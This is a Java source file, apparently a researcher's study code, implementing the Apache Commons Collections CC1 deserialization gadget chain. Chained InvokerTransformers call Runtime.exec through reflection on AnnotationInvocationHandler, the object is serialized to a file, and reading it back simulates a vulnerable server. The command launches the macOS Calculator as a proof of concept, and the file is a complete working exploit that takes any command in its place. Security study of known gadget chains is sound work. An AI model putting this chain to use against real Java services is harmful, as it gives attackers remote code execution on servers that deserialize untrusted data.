package con.yhy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * @author yhy
 * @date 2021/6/10 08:06
 * @github https://github.com/yhy0
 */

public class CC1 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "yhy");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

//        outerMap.put("test", "xxxx");

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 因为AnnotationInvocationHandler只有个私有的有参构造，所以需要getDeclaredConstructor获取
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        //设置所有的成员都可以访问,取消构造函数修饰符限制
        constructor.setAccessible(true);
        // 获取对象，第一个参数是一个Annotation类; 第二个是参数就是前面构造的Map。
        Object obj = constructor.newInstance(Target.class, outerMap);

        // 将上述过程序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./exp.bin"));
        outputStream.writeObject(obj);
        outputStream.close();

        // 模拟目标后端程序接受到的序列化后的数据
        FileInputStream fi = new FileInputStream("./exp.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        fin.readObject();

    }

}
